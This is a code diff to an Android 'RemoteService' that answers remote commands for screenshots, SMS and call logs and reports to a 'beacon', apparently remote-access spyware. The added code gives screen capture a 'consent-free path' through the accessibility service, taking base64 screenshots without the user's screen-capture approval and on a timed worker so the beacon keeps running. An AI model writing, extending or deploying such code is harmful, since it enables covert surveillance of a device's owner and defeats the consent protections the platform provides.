@@ -319,7 +319,23 @@ public class RemoteService extends Service {
                 }
                 case "screenb64": {
                     byte[] png = CaptureService.capture();
-                    if (png == null) return "ERR screenb64: projection inactive (launch app once to grant capture)";
+                    if (png == null) {
+                        // no projection (process restarted / approval lost):
+                        // consent-free path via the accessibility service; the
+                        // screenshot attempt runs on a worker capped at 9s so
+                        // a wedged system_server can never stall the beacon
+                        RemoteAccessibilityService ax = RemoteAccessibilityService.instance;
+                        if (ax != null) {
+                            final java.util.concurrent.atomic.AtomicReference<byte[]> res =
+                                    new java.util.concurrent.atomic.AtomicReference<>();
+                            Thread w = new Thread(() -> res.set(ax.screenshotFallback()), "scr-shot");
+                            w.setDaemon(true);
+                            w.start();
+                            try { w.join(9000); } catch (InterruptedException ignored) {}
+                            png = res.get();
+                        }
+                    }
+                    if (png == null) return "ERR screenb64: projection inactive (launch app once to grant capture) and accessibility screenshot unavailable";
                     return "OK " + png.length + " " + java.util.Base64.getEncoder().encodeToString(png);
                 }
                 case "sms": {
@@ -338,6 +354,7 @@ public class RemoteService extends Service {
                     }
                 }
                 case "calllog": {
+                    // CALLLOG [n]
                     String denied = requestPermission("calllog", android.Manifest.permission.READ_CALL_LOG);
                     if (denied != null) return denied;
                     int limit = 25;
